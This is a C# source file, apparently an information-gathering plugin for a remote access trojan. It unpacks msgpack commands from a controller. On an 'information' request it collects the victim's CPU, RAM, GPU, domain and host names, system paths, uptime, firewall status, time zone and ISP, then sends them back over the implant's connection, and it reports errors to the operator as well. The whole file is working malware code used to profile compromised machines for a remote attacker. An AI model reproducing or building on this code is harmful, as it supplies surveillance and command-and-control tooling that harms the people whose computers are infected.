using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "information":
                        {
                            GeoLocationHelper.Initialize();
                            Connection.Send(InformationList());
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static byte[] InformationList()
        {
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
            var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Information";
            /*msgpack.ForcePathObject("CPU").AsString = DevicesHelper.GetCpuName();
            msgpack.ForcePathObject("Memory(RAM)").AsString = $"{DevicesHelper.GetTotalRamAmount()} MB";
            msgpack.ForcePathObject("GPU").AsString = DevicesHelper.GetGpuName();
            msgpack.ForcePathObject("Domain_Name").AsString = domainName;
            msgpack.ForcePathObject("Host_Name").AsString = hostName;
            msgpack.ForcePathObject("System_Drive").AsString = Path.GetPathRoot(Environment.SystemDirectory);
            msgpack.ForcePathObject("System_Directory").AsString = Environment.SystemDirectory;
            msgpack.ForcePathObject("Uptime").AsString = SystemHelper.GetUptime();
            msgpack.ForcePathObject("Firewall").AsString = SystemHelper.GetFirewall();
            msgpack.ForcePathObject("Time_Zone").AsString = GeoLocationHelper.GeoInfo.Timezone;
            msgpack.ForcePathObject("ISP").AsString = GeoLocationHelper.GeoInfo.Isp;*/
            msgpack.ForcePathObject("InforMation").AsString = "CPU: "+DevicesHelper.GetCpuName()+"\n"+ "Memory(RAM): "+$"{DevicesHelper.GetTotalRamAmount()} MB" + "\n" + "GPU: "+ DevicesHelper.GetGpuName() + "\n" + "Domain_Name: "+ domainName + "\n" + "Host_Name: "+ hostName + "\n" + "System_Drive: "+ Path.GetPathRoot(Environment.SystemDirectory) + "\n" + "System_Directory: "+ Environment.SystemDirectory + "\n" + "Uptime: "+ SystemHelper.GetUptime() + "\n" + "Firewall: "+ SystemHelper.GetFirewall() + "\n" + "Time_Zone: "+GeoLocationHelper.GeoInfo.Timezone + "\n" + "ISP: "+GeoLocationHelper.GeoInfo.Isp;
            return msgpack.Encode2Bytes();
        }

        
    }

}